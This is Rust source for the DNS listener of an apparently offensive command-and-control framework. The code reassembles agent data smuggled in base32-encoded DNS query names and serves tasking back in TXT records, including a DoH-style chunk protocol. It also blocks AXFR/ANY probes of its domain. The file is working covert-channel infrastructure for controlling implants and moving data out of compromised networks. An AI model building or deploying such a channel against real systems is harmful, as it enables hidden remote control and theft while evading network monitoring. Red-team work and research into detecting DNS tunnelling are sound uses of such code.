//! DNS C2 listener (UDP authoritative + legacy/DoH query handling).

use std::collections::HashMap;
use std::net::IpAddr;
use std::sync::Arc;
use std::time::{Duration, Instant};

use red_cell_common::DnsListenerConfig;
use tokio::net::UdpSocket;
use tokio::sync::Mutex;
use tracing::warn;

use crate::{
    AgentRegistry, CommandDispatcher, Database, DemonInitSecretConfig, DemonPacketParser,
    PluginRuntime, ShutdownController, SocketRelayManager, dispatch::DownloadTracker,
    events::EventBus,
};

use super::{
    DemonInitRateLimiter, DnsReconBlockLimiter, ListenerManagerError, ListenerRuntimeFuture,
    ReconnectProbeRateLimiter, UnknownCallbackProbeAuditLimiter,
};

pub(crate) mod handler;
pub(crate) mod packet;

// Re-export packet helpers so external callers (tests, other listeners) can access them via
// `crate::listeners::dns::*` without needing to reach into the `packet` sub-module.
#[allow(unused_imports)]
pub(crate) use packet::{
    DnsC2Query, ParsedDnsQuery, base32_rfc4648_decode, base32_rfc4648_encode, base32hex_decode,
    base32hex_encode, build_dns_c2_response, build_dns_nxdomain_response,
    build_dns_refused_response, chunk_response_to_b32hex, chunk_response_to_doh_b32,
    dns_allowed_query_types, dns_wire_domain_from_ascii_payload, normalize_session_hex16,
    parse_dns_c2_query, parse_dns_query,
};

// ── DNS C2 Listener ──────────────────────────────────────────────────────────

/// DNS wire-format header length in bytes.
pub(crate) const DNS_HEADER_LEN: usize = 12;
/// DNS record type for TXT records.
pub(crate) const DNS_TYPE_TXT: u16 = 16;
/// DNS record type for A records.
pub(crate) const DNS_TYPE_A: u16 = 1;
/// DNS record type for CNAME records.
pub(crate) const DNS_TYPE_CNAME: u16 = 5;
/// DNS record class IN.
pub(crate) const DNS_CLASS_IN: u16 = 1;
/// DNS flag: Query/Response bit.
pub(crate) const DNS_FLAG_QR: u16 = 0x8000;
/// DNS flag: Authoritative Answer bit.
pub(crate) const DNS_FLAG_AA: u16 = 0x0400;
/// DNS RCODE: No Error.
pub(crate) const DNS_RCODE_NOERROR: u16 = 0;
/// DNS RCODE: NXDOMAIN (name does not exist).
pub(crate) const DNS_RCODE_NXDOMAIN: u16 = 3;
/// DNS RCODE: Refused.
pub(crate) const DNS_RCODE_REFUSED: u16 = 5;
/// DNS query type for zone transfers (AXFR, RFC 5936). Blocked unconditionally.
pub(crate) const DNS_QTYPE_AXFR: u16 = 252;
/// DNS query type for "all records" (ANY/QTYPE=*, RFC 8482). Blocked unconditionally.
pub(crate) const DNS_QTYPE_ANY: u16 = 255;
/// Maximum age in seconds before a pending DNS upload is discarded.
pub(crate) const DNS_UPLOAD_TIMEOUT_SECS: u64 = 120;
/// How often the DNS listener prunes expired upload sessions.
pub(crate) const DNS_UPLOAD_CLEANUP_INTERVAL_SECS: u64 = 30;
/// Maximum number of chunks accepted for a single legacy DNS upload.
pub(crate) const DNS_MAX_UPLOAD_CHUNKS: u16 = 256;
/// Maximum chunks for Specter/Archon DoH uplink (`<seq:04x><total:04x>` in the query name).
pub(crate) const DNS_DOH_MAX_UPLOAD_CHUNKS: u16 = 1000;
/// Downlink chunk size for DoH (matches `agent/specter` `CHUNK_BYTES`).
pub(crate) const DNS_DOH_RESPONSE_CHUNK_BYTES: usize = 37;
/// Session label length (`<session_hex16>` in DoH names).
pub(crate) const DNS_DOH_SESSION_HEX_LEN: usize = 16;
/// Maximum number of concurrent DNS upload sessions retained in memory.
pub(crate) const DNS_MAX_PENDING_UPLOADS: usize = 1000;
/// Maximum number of concurrent DNS upload sessions allowed per source IP.
pub(crate) const DNS_MAX_UPLOADS_PER_IP: usize = 10;
/// Maximum number of pending DNS download responses retained in memory.
pub(crate) const DNS_MAX_PENDING_RESPONSES: usize = 1000;
/// Maximum total size (in bytes) of all pending DNS download response chunks combined.
/// Limits memory consumption when many agents have large queued responses.
pub(crate) const DNS_MAX_PENDING_RESPONSE_BYTES: usize = 8 * 1024 * 1024;
/// Maximum response chunk size in bytes (encoded as base32hex in a TXT string).
/// 200 base32hex chars × 5 bits ÷ 8 = 125 bytes.
pub(crate) const DNS_RESPONSE_CHUNK_BYTES: usize = 125;
/// Maximum number of download chunks that fit in a u16 sequence counter.
///
/// The DNS download protocol uses a u16 `seq` field, so responses that would
/// require more than 65 535 chunks cannot be delivered without silent truncation.
/// Payloads exceeding `DNS_MAX_DOWNLOAD_CHUNKS * DNS_RESPONSE_CHUNK_BYTES`
/// (~7.8 MB) are rejected at queue time.
pub(crate) const DNS_MAX_DOWNLOAD_CHUNKS: usize = u16::MAX as usize;
/// Base32hex alphabet (RFC 4648 §7): 0-9 followed by A-V.
pub(crate) const BASE32HEX_ALPHABET: &[u8; 32] = b"0123456789ABCDEFGHIJKLMNOPQRSTUV";
/// RFC 4648 base32 alphabet (lowercase).
pub(crate) const BASE32_RFC4648_ALPHABET: &[u8; 32] = b"abcdefghijklmnopqrstuvwxyz234567";
/// Maximum octets in a single DNS label (RFC 1035).
pub(crate) const DNS_MAX_LABEL_LEN: usize = 63;
/// Maximum wire-format length of a domain name (RFC 1035).
pub(crate) const DNS_MAX_DOMAIN_WIRE_LEN: usize = 255;

/// In-progress multi-chunk upload reassembly buffer for a DNS C2 agent.
#[derive(Debug)]
pub(crate) struct DnsPendingUpload {
    /// Received chunks indexed by sequence number.
    pub(crate) chunks: HashMap<u16, Vec<u8>>,
    /// Total number of expected chunks.
    pub(crate) total: u16,
    /// Timestamp of the first chunk (for expiry tracking).
    pub(crate) received_at: Instant,
    /// Source IP that opened this upload session (used for per-IP rate limiting).
    pub(crate) peer_ip: IpAddr,
}

/// Pre-chunked C2 response ready to be polled by a DNS agent.
///
/// Responses are **not** bound to a specific resolver IP.  DNS recursive
/// resolvers may rotate source addresses between an upload and the
/// follow-up download, so pinning to `peer_ip` would strand legitimate
/// agents.  Anti-spoofing is handled by the per-agent AES-256-CTR
/// encryption — only the holder of the agent key can decrypt the payload.
#[derive(Debug)]
pub(crate) struct DnsPendingResponse {
    /// Base32hex-encoded response chunks.
    pub(crate) chunks: Vec<String>,
    /// Timestamp of when the response was queued for download.
    pub(crate) received_at: Instant,
}

#[derive(Debug, PartialEq, Eq)]
pub(crate) enum DnsUploadAssembly {
    Pending,
    Complete(Vec<u8>),
    Rejected,
}

/// Shared runtime state for the DNS C2 listener.
///
/// # DNS C2 Protocol
///
/// All DNS queries targeting the configured [`DnsListenerConfig::domain`] are
/// treated as C2 traffic. Two query sub-types are supported:
///
/// ## Upload (agent → teamserver)
///
/// ```text
/// <B32HEX-CHUNK>.<SEQ>-<TOTAL>-<AGENTID>.up.<DOMAIN>
/// ```
///
/// * `B32HEX-CHUNK` — base32hex-encoded data slice (max 39 bytes per label)
/// * `SEQ` — zero-based hex chunk index
/// * `TOTAL` — hex total chunk count
/// * `AGENTID` — 8-character lowercase hex agent identifier
///
/// The listener acknowledges each chunk with a TXT response:
/// * `ok`  — chunk stored; more chunks expected
/// * `ack` — all chunks received and the Demon packet was processed
/// * `err` — reassembly or Demon protocol error
///
/// ## Download (teamserver → agent)
///
/// ```text
/// <SEQ>-<AGENTID>.dn.<DOMAIN>
/// ```
///
/// The server responds with a TXT record:
/// * `wait`              — no response queued for this agent
/// * `<TOTAL> <B32HEX>` — total chunk count and the requested chunk
/// * `done`              — `SEQ` is past the end of the response
///
/// ## Specter/Archon DoH grammar (same DNS listener, UDP authoritative)
///
/// Uplink (agent → teamserver), one TXT query per chunk:
/// ```text
/// <base32/rfc4648>.<seq:04x><total:04x>.<session_hex16>.u.<DOMAIN>
/// ```
///
/// * `session_hex16` — 16 lowercase hex chars (8 random bytes)
/// * Uplink chunks are acknowledged with **NXDOMAIN** (no TXT body)
///
/// Ready poll:
/// ```text
/// rdy.<session_hex16>.d.<DOMAIN>
/// ```
///
/// * While the response is not ready: **NXDOMAIN**
/// * When ready: TXT `\<total_chunks\>` as lowercase hexadecimal (no `0x` prefix)
///
/// Chunk fetch:
/// ```text
/// <seq:04x>.<session_hex16>.d.<DOMAIN>
/// ```
///
/// * TXT record: **only** the base32/RFC4648 payload for that chunk (no `TOTAL` prefix)
#[derive(Debug)]
pub(crate) struct DnsListenerState {
    pub(crate) config: DnsListenerConfig,
    pub(crate) registry: AgentRegistry,
    pub(crate) database: Database,
    pub(crate) parser: DemonPacketParser,
    pub(crate) events: EventBus,
    pub(crate) dispatcher: CommandDispatcher,
    pub(crate) demon_init_rate_limiter: DemonInitRateLimiter,
    pub(crate) unknown_callback_probe_audit_limiter: UnknownCallbackProbeAuditLimiter,
    pub(crate) reconnect_probe_rate_limiter: ReconnectProbeRateLimiter,
    /// Rate limiter that blocks IPs sending repeated AXFR/ANY recon queries.
    pub(crate) dns_recon_block_limiter: DnsReconBlockLimiter,
    pub(crate) shutdown: ShutdownController,
    /// Pending uploads keyed by agent ID.
    pub(crate) uploads: Mutex<HashMap<u32, DnsPendingUpload>>,
    /// Pending responses keyed by agent ID.
    pub(crate) responses: Mutex<HashMap<u32, DnsPendingResponse>>,
    /// DoH-style uploads keyed by session (16 hex chars).
    pub(crate) doh_uploads: Mutex<HashMap<String, DnsPendingUpload>>,
    /// DoH-style responses keyed by session; chunk strings are RFC4648 base32.
    pub(crate) doh_responses: Mutex<HashMap<String, DnsPendingResponse>>,
}

impl DnsListenerState {
    #[allow(clippy::too_many_arguments)]
    pub(crate) fn new(
        config: &DnsListenerConfig,
        registry: AgentRegistry,
        events: EventBus,
        database: Database,
        sockets: SocketRelayManager,
        plugins: Option<PluginRuntime>,
        downloads: DownloadTracker,
        demon_init_rate_limiter: DemonInitRateLimiter,
        unknown_callback_probe_audit_limiter: UnknownCallbackProbeAuditLimiter,
        reconnect_probe_rate_limiter: ReconnectProbeRateLimiter,
        dns_recon_block_limiter: DnsReconBlockLimiter,
        shutdown: ShutdownController,
        init_secret_config: DemonInitSecretConfig,
        max_pivot_chain_depth: usize,
        allow_legacy_ctr: bool,
    ) -> Self {
        Self {
            config: config.clone(),
            registry: registry.clone(),
            database: database.clone(),
            parser: DemonPacketParser::with_init_secret_config(
                registry.clone(),
                init_secret_config.clone(),
            )
            .with_allow_legacy_ctr(allow_legacy_ctr),
            events: events.clone(),
            dispatcher: CommandDispatcher::with_builtin_handlers_and_downloads(
                registry.clone(),
                events.clone(),
                database,
                sockets,
                plugins,
                downloads,
                max_pivot_chain_depth,
                allow_legacy_ctr,
                init_secret_config,
            ),
            demon_init_rate_limiter,
            unknown_callback_probe_audit_limiter,
            reconnect_probe_rate_limiter,
            dns_recon_block_limiter,
            shutdown,
            uploads: Mutex::new(HashMap::new()),
            responses: Mutex::new(HashMap::new()),
            doh_uploads: Mutex::new(HashMap::new()),
            doh_responses: Mutex::new(HashMap::new()),
        }
    }

    pub(crate) async fn handle_dns_packet(&self, buf: &[u8], peer_ip: IpAddr) -> Option<Vec<u8>> {
        let query = parse_dns_query(buf)?;

        // AXFR and ANY queries have no legitimate use on a C2 DNS listener and
        // are indicators of active zone enumeration or DNS amplification probing.
        // Block them before any C2 parsing, log at WARN, and rate-limit repeat
        // offenders so the log stays actionable (silent drop after threshold).
        if query.qtype == DNS_QTYPE_AXFR || query.qtype == DNS_QTYPE_ANY {
            let below_threshold = self.dns_recon_block_limiter.allow(peer_ip).await;
            if below_threshold {
                warn!(
                    listener = %self.config.name,
                    %peer_ip,
                    qtype = query.qtype,
                    "dns recon query detected (AXFR/ANY) — returning REFUSED"
                );
                return Some(build_dns_refused_response(query.id));
            } else {
                warn!(
                    listener = %self.config.name,
                    %peer_ip,
                    qtype = query.qtype,
                    "dns recon query from repeat offender — dropping without response"
                );
                return None;
            }
        }

        let Some(allowed_qtypes) = dns_allowed_query_types(&self.config.record_types) else {
            warn!(
                listener = %self.config.name,
                record_types = %self.config.record_types.join(","),
                "dns listener has unsupported record type configuration"
            );
            return Some(build_dns_refused_response(query.id));
        };

        if !allowed_qtypes.contains(&query.qtype) {
            return Some(build_dns_refused_response(query.id));
        }

        let Some(c2_query) = parse_dns_c2_query(&query.labels, &self.config.domain) else {
            return Some(build_dns_refused_response(query.id));
        };

        match c2_query {
            DnsC2Query::Upload { agent_id, seq, total, data } => {
                let txt = self.handle_upload(agent_id, seq, total, data, peer_ip).await;
                Some(self.dns_c2_response_or_refused(
                    query.id,
                    &query.qname_raw,
                    query.qtype,
                    txt.as_bytes(),
                ))
            }
            DnsC2Query::Download { agent_id, seq } => {
                let txt = self.handle_download(agent_id, seq).await;
                Some(self.dns_c2_response_or_refused(
                    query.id,
                    &query.qname_raw,
                    query.qtype,
                    txt.as_bytes(),
                ))
            }
            DnsC2Query::DohUpload { session, seq, total, data } => {
                let ok = self.handle_doh_upload(session, seq, total, data, peer_ip).await;
                if ok {
                    Some(build_dns_nxdomain_response(query.id, &query.qname_raw, query.qtype))
                } else {
                    Some(build_dns_refused_response(query.id))
                }
            }
            DnsC2Query::DohReady { session } => match self.handle_doh_ready(&session).await {
                Some(total_chunks) => {
                    let txt = format!("{total_chunks:x}");
                    Some(self.dns_c2_response_or_refused(
                        query.id,
                        &query.qname_raw,
                        query.qtype,
                        txt.as_bytes(),
                    ))
                }
                None => Some(build_dns_nxdomain_response(query.id, &query.qname_raw, query.qtype)),
            },
            DnsC2Query::DohDownload { session, seq } => {
                let txt = self.handle_doh_download(&session, seq).await;
                Some(self.dns_c2_response_or_refused(
                    query.id,
                    &query.qname_raw,
                    query.qtype,
                    txt.as_bytes(),
                ))
            }
        }
    }

    /// Build a DNS response for the C2 payload, or REFUSED when the payload cannot be encoded
    /// for the query type (for example, payloads longer than four octets for `A` queries).
    pub(crate) fn dns_c2_response_or_refused(
        &self,
        query_id: u16,
        qname_raw: &[u8],
        qtype: u16,
        payload: &[u8],
    ) -> Vec<u8> {
        match build_dns_c2_response(query_id, qname_raw, qtype, payload) {
            Some(resp) => resp,
            None => {
                warn!(
                    listener = %self.config.name,
                    qtype,
                    payload_len = payload.len(),
                    "dns c2 response cannot be encoded for this query type; sending REFUSED"
                );
                build_dns_refused_response(query_id)
            }
        }
    }
}

#[allow(clippy::too_many_arguments)]
pub(crate) async fn spawn_dns_listener_runtime(
    config: &DnsListenerConfig,
    registry: AgentRegistry,
    events: EventBus,
    database: Database,
    sockets: SocketRelayManager,
    plugins: Option<PluginRuntime>,
    downloads: DownloadTracker,
    demon_init_rate_limiter: DemonInitRateLimiter,
    unknown_callback_probe_audit_limiter: UnknownCallbackProbeAuditLimiter,
    reconnect_probe_rate_limiter: ReconnectProbeRateLimiter,
    shutdown: ShutdownController,
    init_secret_config: DemonInitSecretConfig,
    max_pivot_chain_depth: usize,
    allow_legacy_ctr: bool,
) -> Result<ListenerRuntimeFuture, ListenerManagerError> {
    if dns_allowed_query_types(&config.record_types).is_none() {
        return Err(ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!(
                "unsupported DNS record type configuration: {}",
                config.record_types.join(",")
            ),
        });
    }

    let state = Arc::new(DnsListenerState::new(
        config,
        registry,
        events,
        database,
        sockets,
        plugins,
        downloads,
        demon_init_rate_limiter,
        unknown_callback_probe_audit_limiter,
        reconnect_probe_rate_limiter,
        DnsReconBlockLimiter::new(),
        shutdown,
        init_secret_config,
        max_pivot_chain_depth,
        allow_legacy_ctr,
    ));
    let addr = format!("{}:{}", config.host_bind, config.port_bind);

    let socket =
        UdpSocket::bind(&addr).await.map_err(|error| ListenerManagerError::StartFailed {
            name: config.name.clone(),
            message: format!("failed to bind DNS UDP socket {addr}: {error}"),
        })?;

    Ok(Box::pin(async move {
        let mut buf = vec![0u8; 4096];
        let mut cleanup_interval =
            tokio::time::interval(Duration::from_secs(DNS_UPLOAD_CLEANUP_INTERVAL_SECS));
        let shutdown_signal = state.shutdown.notified();
        tokio::pin!(shutdown_signal);
        loop {
            tokio::select! {
                _ = cleanup_interval.tick() => {
                    state.cleanup_expired_uploads().await;
                }
                _ = &mut shutdown_signal => {
                    return Ok(());
                }
                recv = socket.recv_from(&mut buf) => {
                    let (len, peer) = match recv {
                        Ok(result) => result,
                        Err(error) => {
                            return Err(format!(
                                "dns listener `{}` recv error: {error}",
                                state.config.name
                            ));
                        }
                    };

                    let peer_ip = peer.ip();
                    let packet = &buf[..len];

                    // Process DNS packets on the receive loop to keep backpressure bounded by the
                    // socket buffer instead of creating an unbounded task queue under UDP flood.
                    if let Some(response) = state.handle_dns_packet(packet, peer_ip).await {
                        if let Err(error) = socket.send_to(&response, peer).await {
                            warn!(listener = %state.config.name, %error, "dns listener send error");
                        }
                    }
                }
            }
        }
    }))
}

// Production builds must keep the DNS runtime entrypoint available so manager start paths
// cannot silently drift back to a test-only implementation.
const _: () = {
    let _ = spawn_dns_listener_runtime;
};
